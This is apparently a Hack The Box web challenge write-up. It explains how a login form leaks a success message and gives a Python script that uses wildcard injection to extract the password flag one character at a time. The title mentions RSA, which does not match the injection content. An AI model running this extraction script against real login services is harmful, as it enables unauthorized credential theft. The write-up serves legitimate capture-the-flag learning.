---
title: RSA Common Modulus
date: 2020-11-15 00:00:00 +0200
categories: [Hack The Box, Challenges, Web]
tags: [web, injection, brute force]
---

We see that there is a form. At the bottom we can see the username we are supposed to use.
It doesn't take a genius to see that the password is most likely the flag.

While testing we see that we can send requests with data that follows `{'username':user, 'password':pass}`
Also, when the characters do appear in the right order in the password the request has a message `"No search results."` in it.

Thus we write a small python script to do just that:

```python
#!/usr/bin/python3
import requests
import string
import sys

# Get this from HTB
challenge_url = '178.128.40.63:31567' # CHANGE THIS

url = 'http://%s/login' % challenge_url
alphabet = string.ascii_letters + string.digits + "_@{}-/()!\"$%=^[]:;"

user = 'reese'
password = ''

finished = False
while not finished:
    for char in alphabet:

            query = f'{password}{char}*'
            data = {'username':user, 'password':query}

            r = requests.post(url, data=data)
            sys.stdout.write(f"\rTrying {password}{char}")

            if "No search results." in r.text: # Add character to password on successful login
                password += str(char)
                break
            
            if char == alphabet[-1]: # If reached last of characters, password must be finished 
                finished = True
                print(f"\rGot password for reese user: {password}")
```

And then you get the flag